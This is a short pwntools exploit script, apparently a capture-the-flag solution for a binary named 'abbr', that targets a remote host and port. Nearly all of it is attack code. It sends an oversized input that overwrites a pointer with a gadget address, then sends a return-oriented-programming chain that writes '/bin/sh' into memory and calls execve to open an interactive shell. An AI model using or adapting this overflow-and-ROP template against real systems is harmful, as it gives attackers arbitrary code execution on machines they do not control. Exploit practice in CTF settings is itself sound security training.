#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = '168.119.108.148', 10010
binary = './abbr'
brkpts = '''
b*0x402036
c
'''

elf = ELF("abbr")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
# context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(remote_ip, port)
    context.noptrace = True

elif len(sys.argv) > 1:
    io = gdb.debug(binary, brkpts)

else:
    io = process(binary)

god = 0x405121
pop_rdi = 0x4018da
pop_rax = 0x45a8f7
pop_rsi = 0x404cfe
pop_rdx = 0x4017df
syscall = 0x41e504
mov_rdi_rsi = 0x456850 # mov dword ptr [rdi], esi ; ret
bss = 0x4ccec0

if __name__ == "__main__":
    payload = ("fyiidk").rjust(0x1000-10, "a") + p64(god)
    sla("text: ", payload)

    payload = flat([
        pop_rdi, bss + 4,
        pop_rsi, 0x68732f,
        mov_rdi_rsi,
        pop_rdi, bss,
        pop_rsi, 0x6e69622f,
        mov_rdi_rsi,
        pop_rax, 0x3b,
        pop_rsi, 0,
        pop_rdx, 0,
        syscall
    ])
    sla("text: ", payload)
    io.interactive()
